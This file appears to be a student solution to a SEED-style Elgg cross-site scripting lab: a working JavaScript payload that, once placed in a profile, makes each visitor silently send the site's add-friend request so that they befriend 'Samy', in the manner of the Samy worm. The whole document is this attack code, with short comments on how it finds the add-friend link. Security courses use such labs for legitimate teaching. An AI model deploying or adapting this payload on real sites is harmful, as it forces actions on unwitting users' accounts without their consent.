// solution 1
<script type="text/javascript">
	window.onload = function () {
	//alert('XSS');
	var Ajax=null;
	//var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	//var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.
	var anchorLink = document.getElementsByClassName('elgg-button');   // ***add friend button has class elgg-button so finding all the elements under elgg-button
	var sendurl = anchorLink[1].getAttribute('href'); //from all the elements under elgg-button 2nd element (1st indexed) is a hyperlink that sends the get request
                                                      //to make friends... so extracting that link... we will use this link as our get request url...***
	//console.log(sendurl);
	
	if(elgg.session.user.guid!=elgg.page_owner.guid)
	{

		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		/*Ajax.onreadystatechange = function() {
				//if (xhr.readyState === 4) {
				 // callback(xhr.response);
				//}
				console.log(Ajax.readyState);
				console.log(Ajax.response);			
		}*/	
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
	}
	
}
</script>
